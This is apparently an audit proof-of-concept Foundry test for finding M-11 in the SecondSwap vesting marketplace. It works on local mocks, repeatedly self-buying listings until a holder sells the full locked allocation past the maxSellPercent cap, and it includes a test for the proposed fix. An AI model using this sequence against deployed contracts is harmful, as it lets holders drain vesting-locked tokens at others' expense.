// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../../contracts/SecondSwap_StepVesting.sol";
import "../../contracts/SecondSwap_VestingManager.sol";
import "../../contracts/SecondSwap_Marketplace.sol";
import "../../contracts/SecondSwap_MarketplaceSetting.sol";

/// @dev Minimal ERC20 with a public mint; 18 decimals (OZ default). The vesting token must implement
/// decimals() because Marketplace.listVesting probes it via doesFunctionExist + IERC20Extended(...).decimals().
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

/// Assisted-mode PoC for P97 M-11 — SecondSwap maxSellPercent self-purchase bypass.
/// Mechanism (in-scope source, commit 6693d9e4):
///   - Marketplace._validatePurchase has NO buyer!=seller check -> a holder may buy their OWN public listing.
///   - VestingManager.completePurchase credits allocations[buyer].bought += amount unconditionally.
///   - VestingManager.listVesting: sellLimit = bought + maxSellPercent*(currentAlloc+sold-bought)/BASE.
///     `bought` is added at 100% while (currentAlloc+sold-bought) stays = original allocation A, so repeated
///     self-purchase cycles inflate `bought` and grow sellLimit without bound -> the maxSellPercent cap on the
///     ORIGINAL locked allocation is bypassed for only marketplace fees.
contract M11SelfPurchasePoC is Test {
    MockERC20 vestingToken;
    MockERC20 currency;
    SecondSwap_VestingManager vmgr;
    SecondSwap_MarketplaceSetting setting;
    SecondSwap_Marketplace mkt;
    SecondSwap_StepVesting sv;

    address admin = makeAddr("admin");
    address tokenIssuer = makeAddr("tokenIssuer");
    address holder = makeAddr("holder"); // attacker: both seller and buyer
    address externalBuyer = makeAddr("externalBuyer");
    address feeCollector = makeAddr("feeCollector");
    address whitelistDeployer = makeAddr("whitelistDeployer"); // unused for public listings

    uint256 constant A = 1000 ether;     // holder's original locked allocation
    uint256 constant BASE = 10000;
    uint256 constant PRICE = 1e18;       // price per unit; with 18-decimals token -> baseAmount == amount
    uint256 maxSell;                     // basis points (set by setSellable default = 2000 = 20%)
    uint256 intendedCap;                 // maxSell * A / BASE

    function setUp() public {
        vestingToken = new MockERC20("Vest", "VEST");
        currency = new MockERC20("USD", "USD");

        // VestingManager (upgradeable initializer)
        vmgr = new SecondSwap_VestingManager();
        vmgr.initialize(admin);

        // MarketplaceSetting carries fees/feeCollector/vestingManager/currency
        setting = new SecondSwap_MarketplaceSetting(
            feeCollector, admin, whitelistDeployer, address(vmgr), address(currency)
        );

        // Marketplace (upgradeable initializer): supports `currency` as payment, points at setting
        mkt = new SecondSwap_Marketplace();
        mkt.initialize(address(currency), address(setting));

        // wire marketplace into the vesting manager
        vm.prank(admin);
        vmgr.setMarketplace(address(mkt));

        // StepVesting: manager = vmgr so VM.transferVesting calls are authorized
        uint256 start = block.timestamp;
        uint256 end = start + 10 days;
        sv = new SecondSwap_StepVesting(tokenIssuer, address(vmgr), vestingToken, start, end, 10, address(this));

        // make the plan sellable -> sets maxSellPercent = 2000, buyerFee/sellerFee = -1 (fall back to global 250)
        vm.prank(admin);
        vmgr.setSellable(address(sv), true);
        // public getter returns the struct as a positional tuple: (sellable, maxSellPercent, buyerFee, sellerFee)
        (, uint256 ms_, , ) = vmgr.vestingSettings(address(sv));
        maxSell = ms_;
        intendedCap = (A * maxSell) / BASE;

        // fund the vesting: tokenIssuer holds A and approves StepVesting, then creates the holder's allocation
        vestingToken.mint(tokenIssuer, A);
        vm.prank(tokenIssuer);
        vestingToken.approve(address(sv), A);
        vm.prank(tokenIssuer);
        sv.createVesting(holder, A);

        // give holder + externalBuyer ample currency for fees / purchases and approve the marketplace
        currency.mint(holder, 1e30);
        currency.mint(externalBuyer, 1e30);
        vm.prank(holder);
        currency.approve(address(mkt), type(uint256).max);
        vm.prank(externalBuyer);
        currency.approve(address(mkt), type(uint256).max);
    }

    function _list(address who, uint256 amount) internal returns (uint256 listingId) {
        listingId = mkt.nextListingId(address(sv));
        vm.prank(who);
        mkt.listVesting(
            address(sv), amount, PRICE, 0,
            SecondSwap_Marketplace.ListingType.PARTIAL,
            SecondSwap_Marketplace.DiscountType.NO,
            0, address(currency), 0, false
        );
    }

    function _buy(address who, uint256 listingId, uint256 amount) internal {
        vm.prank(who);
        mkt.spotPurchase(address(sv), listingId, amount, address(0));
    }

    function _sold() internal view returns (uint256 sold) {
        (, sold) = vmgr.allocations(holder, address(sv));
    }

    function _bought() internal view returns (uint256 bought) {
        (bought, ) = vmgr.allocations(holder, address(sv));
    }

    function test_M11_SelfPurchaseInflatesBoughtAndBypassesMaxSellPercent() public {
        assertEq(maxSell, 2000, "default maxSellPercent");
        assertEq(intendedCap, A / 5, "intended cap = 20% of allocation");

        // ---- (1) baseline: the cap is actually enforced before the exploit ----
        uint256 id0 = _list(holder, intendedCap);          // sold = cap (allowed up to the cap)
        assertEq(_sold(), intendedCap, "listed exactly the cap");
        vm.prank(holder);
        vm.expectRevert(bytes("SS_VestingManager: cannot list more than max sell percent"));
        mkt.listVesting(
            address(sv), 1, PRICE, 0,
            SecondSwap_Marketplace.ListingType.PARTIAL,
            SecondSwap_Marketplace.DiscountType.NO,
            0, address(currency), 0, false
        );

        // ---- (2) self-purchase is allowed (no buyer!=seller check) and credits `bought` ----
        _buy(holder, id0, intendedCap);                    // holder buys its OWN listing
        assertEq(_bought(), intendedCap, "completePurchase credited holder.bought from self-purchase");

        // ---- (3) bypass: holder can now list BEYOND the original cap ----
        _list(holder, intendedCap);                        // id1 ; succeeds because sellLimit grew to 2*cap
        assertGt(_sold(), intendedCap,
            "self-purchase inflated sellable beyond maxSellPercent");

        // ---- (4) full allocation: keep cycling until cumulative sold reaches the ENTIRE allocation A ----
        // already at sold = 2*cap, bought = cap. Continue self-buying then re-listing.
        // self-buy id1 -> bought = 2*cap ; then lists 2..4.
        _buy(holder, 1, intendedCap);                      // bought = 2*cap
        for (uint256 j = 2; j <= 4; j++) {
            uint256 idj = _list(holder, intendedCap);      // sold = (j+1)*cap
            if (j < 4) {
                _buy(holder, idj, intendedCap);            // bought = (j+1)*cap
            } else {
                // ---- (5) real exit: a DIFFERENT party buys the final tranche ----
                uint256 buyerVestBefore = sv.available(externalBuyer);
                uint256 holderCurBefore = currency.balanceOf(holder);
                _buy(externalBuyer, idj, intendedCap);
                assertGt(sv.available(externalBuyer), buyerVestBefore,
                    "external buyer received real vested tokens from the over-cap sale");
                assertGt(currency.balanceOf(holder), holderCurBefore,
                    "holder received currency for the over-cap sale");
            }
        }

        // cumulative listed/sellable reached the FULL locked allocation — 5x the intended 20% cap.
        assertGe(_sold(), A,
            "attacker listed/sold the full locked allocation despite maxSellPercent");
        assertGe(_sold(), 5 * intendedCap, "sellable reached 5x the intended cap");
    }

    /// Patch validation. ONLY meaningful when the minimal patch is applied to _validatePurchase:
    ///   require(msg.sender != listing.seller, "SS_Marketplace: no self purchase");
    /// Run with --match-test test_M11_Patch_SelfPurchaseReverts AFTER applying the patch to the source.
    /// Asserts: (a) self-purchase reverts; (b) a normal third-party purchase still succeeds.
    function test_M11_Patch_SelfPurchaseReverts() public {
        uint256 id0 = _list(holder, intendedCap);
        // (a) self-purchase is now blocked
        vm.prank(holder);
        vm.expectRevert(bytes("SS_Marketplace: no self purchase"));
        mkt.spotPurchase(address(sv), id0, intendedCap, address(0));
        // (b) a genuine third-party purchase still works
        uint256 before = sv.available(externalBuyer);
        _buy(externalBuyer, id0, intendedCap);
        assertGt(sv.available(externalBuyer), before, "third-party purchase still works under the patch");
    }
}
